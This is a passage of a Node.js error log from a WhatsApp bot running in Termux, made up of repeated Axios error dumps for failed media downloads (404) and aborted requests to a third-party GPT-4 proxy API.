      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 63283,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [TimersList],
        _idleStart: 11932684,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 63285,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Tue, 30 Jul 2024 05:08:17 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[31/07/24 17:34:18] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 177358,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 4152995,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 177360,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Wed, 31 Jul 2024 10:36:54 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[02/08/24 08:58:31] - AxiosError: aborted
    at AxiosError.from (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:841:14)
    at BrotliDecompress.handleStreamError (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:3069:29)
    at BrotliDecompress.emit (node:events:532:35)
    at emitErrorNT (node:internal/streams/destroy:170:8)
    at emitErrorCloseNT (node:internal/streams/destroy:129:3)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
    at Axios.request (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:4224:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async /data/data/com.termux/files/home/.BOTTT/plugins/ai/openai.js:6:18 {
  code: 'ECONNRESET',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'User-Agent': 'axios/1.7.2',
      'Content-Length': '213',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    method: 'post',
    url: 'https://api.yanzbotz.my.id/api/ai/gpt4',
    data: '{"query":"buatkan saya script tampermonkey mempercepatkan second di semua website","prompt":"Saya adalah Bot Omnipresent, Bot WhatsApp dengan program kecerdasan buatan AI, saya di ciptakan oleh SuryaDev dan Ras."}'
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: true,
    _last: false,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: true,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: '213',
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: true,
    _header: 'POST /api/ai/gpt4 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'Content-Type: application/json\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Content-Length: 213\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: api.yanzbotz.my.id\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype] {},
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 0,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'POST',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/api/ai/gpt4',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: false,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: true,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 200,
      statusMessage: 'OK',
      client: [TLSSocket],
      _consuming: true,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://api.yanzbotz.my.id/api/ai/gpt4',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 26,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'api.yanzbotz.my.id',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 213,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://api.yanzbotz.my.id/api/ai/gpt4',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'api.yanzbotz.my.id',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 11,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'api.yanzbotz.my.id',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: null,
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      handle: [TLSWrap],
      write: [Function: writeAfterFIN],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: null,
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 31611,
      [Symbol(kHandle)]: null,
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: -1,
        _idlePrev: null,
        _idleNext: null,
        _idleStart: 4309662,
        _onTimeout: null,
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: true,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 32508,
        [Symbol(triggerId)]: 31611
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 733,
      [Symbol(kBytesWritten)]: 460,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'content-type': [Array],
      'user-agent': [Array],
      'content-length': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  cause: Error: aborted
      at TLSSocket.socketCloseListener (node:_http_client:462:19)
      at TLSSocket.emit (node:events:532:35)
      at node:net:339:12
      at TCP.done (node:_tls_wrap:659:7) {
    code: 'ECONNRESET'
  }
}
[02/08/24 19:43:53] - AxiosError: read ECONNABORTED
    at AxiosError.from (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:873:14)
    at RedirectableRequest.handleRequestError (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:3152:25)
    at RedirectableRequest.emit (node:events:520:28)
    at eventHandlers.<computed> (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:38:24)
    at ClientRequest.emit (node:events:520:28)
    at TLSSocket.socketErrorListener (node:_http_client:502:9)
    at TLSSocket.emit (node:events:520:28)
    at emitErrorNT (node:internal/streams/destroy:170:8)
    at emitErrorCloseNT (node:internal/streams/destroy:129:3)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
    at Axios.request (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:4262:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async /data/data/com.termux/files/home/.BOTTT/plugins/ai/openai.js:6:18 {
  syscall: 'read',
  code: 'ECONNABORTED',
  errno: -103,
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'User-Agent': 'axios/1.7.3',
      'Content-Length': '661',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    method: 'post',
    url: 'https://api.yanzbotz.my.id/api/ai/gpt4',
